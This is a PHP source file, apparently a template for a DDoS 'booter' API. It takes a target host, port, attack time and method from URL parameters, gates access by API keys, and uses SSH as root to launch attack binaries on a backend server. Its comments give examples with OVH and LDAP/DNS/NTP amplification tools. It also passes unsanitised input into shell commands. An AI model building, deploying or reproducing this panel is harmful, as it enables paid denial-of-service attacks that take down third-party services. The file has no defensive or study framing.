<?php
ignore_user_abort(true);
set_time_limit(0);

/// API SETUP V1 | @2k._tyler
/// 
/// api.php Starter
/// How to Add Multiple Servers:
/// Copy: "/// START ///" To "/// FINISH ///"
/// and Paste It Before The "? >" At The End



/// START ///
/// PUT YOUR SERVER INFO IN THE SPOTS BELOW ///
$server_ip = "SERVERIP";
$server_pass = "SERVERPASS";
$server_user = "root";

$key = $_GET['key'];
$host = $_GET['host'];
$port = intval($_GET['port']);
$time = intval($_GET['time']);
$method = $_GET['method'];
$action = $_GET['action'];
 
/// ADD YOUR METHODS HERE ///
/// Note, you can add more ///
$array = array("ARK-LIFT","ADD-METHOD-HERE","ADD-METHOD-HERE","ADD-METHOD-HERE","ADD-METHOD-HERE","STOP");

/// ADD YOUR KEYS HERE ///
$ray = array("ADDKEYHERE","ADDKEYHERE","ADDKEYHERE");
 

if (!empty($key)){
}else{
die('Error: API key is empty!');} /// THIS ERROR WILL APPEAR IF API KEY IS BLANK ///
 
/// CHECKS IF THE API KEY IS VALID ///
if (in_array($key, $ray)){
}else{
die('Error: Invalid Api Key</br>Your Key Is Either Banned Or Wrong.');}
 
/// CHECKS ATTACK TIME ///
if (!empty($time)){
}else{
die('Error: Invaild Time Entered.');}
 
/// CHECKS IF TARGET IS VALID ///
if (!empty($host)){
}else{
die('Error: Host is empty!');}

/// CHECKS IF THE METHOD IS BLANK ///
if (!empty($method)){
}else{
die('Error: No Method Entered.');}
 
/// CHECKS IF THE METHOD IS INVALID ///
if (in_array($method, $array)){
}else{
die('Error: You Have Entered An Invalid Method.</br>');}

/// PORT LENGTH ///
if ($port > 65500){
die('Error: Incorrect/Invalid Port.');}
 
/// MAX ATTACK TIME (can be lowered or raised) ///           
if ($time > 1200){
die('Error: Max Time Exceeded! (1200 seconds max)');}
 
if(ctype_digit($Time)){
die('Error: Time is not in numeric form!');}
 
if(ctype_digit($Port)){
die('Error: Port is not in numeric form!');}
 
/// METHOD USAGES ///
/// this is were you add your methods to make them attack ///
/// you get the method usage when you do ./METHOD obvsly ur not gonna put METHOD put the file name of the method ///
/// change the first "METHOD" to your method in the vps, change the second "METHOD" ///
/// Heres an Example:
///
/// if ($method == "OVH-KILLERV3") { $command = "screen -dmS ID$host /root/OVH-KILLERV3 $host $port 10 -1 $time";  } ///
/// the "10" is the threads and the "-1 is the pps"
/// Note, Again, you can add more
if ($method == "METHOD") { $command = "screen -dmS ID$host /root/METHOD Usage"; } //Ex: $host $port ldap.txt 1 -1 $time
if ($method == "METHOD") { $command = "screen -dmS ID$host /root/METHOD Usage"; } //Ex: $host $port dns.txt 4 -1 $time
if ($method == "METHOD") { $command = "screen -dmS ID$host /root/METHOD Usage"; } //Ex: $host $port ntp.txt 9 -1 $time
if ($method == "METHOD") { $command = "screen -dmS ID$host /root/METHOD Usage"; } //Ex: $host $port ldap.txt 1 -1 $time
if ($method == "METHOD") { $command = "screen -dmS ID$host /root/METHOD Usage"; } //Ex: $host $port ldap.txt 1 -1 $time
if ($method == "STOP") { $command = "screen -X -S ID$host quit"; }

/// CHECKS IF SSH2 IS INSTALLED ///
if (!function_exists("ssh2_connect")) die("Error: SSH2 does not exist on you're server");
if(!($con = ssh2_connect($server_ip, 22))){
  echo "Error: Connection Issue";
} else {
 
/// Checks Your Server Info ///
    if(!ssh2_auth_password($con, $server_user, $server_pass)) {
        echo "Error: Login failed, one or more of you're server credentials are incorrect.";
    } else {
       
/// Shows If Method Is Not Working Properly ///    
        if (!($stream = ssh2_exec($con, $command ))) {
            echo "Error: You're server was not able to execute you're methods file and or its dependencies";
        } else {
     
            stream_set_blocking($stream, false);
            $data = "";
            while ($buf = fread($stream,4096)) {
                $data .= $buf;
            }
///                           this is what it will show up as when you put it in the url ///
                        echo "Api: Attack Sent Successfully</br>Hitting: $host</br>On Port: $port </br>Attack Time: $time</br>Using Method: $method";
            fclose($stream);
        }
    }
}
/// FINISH ///
?>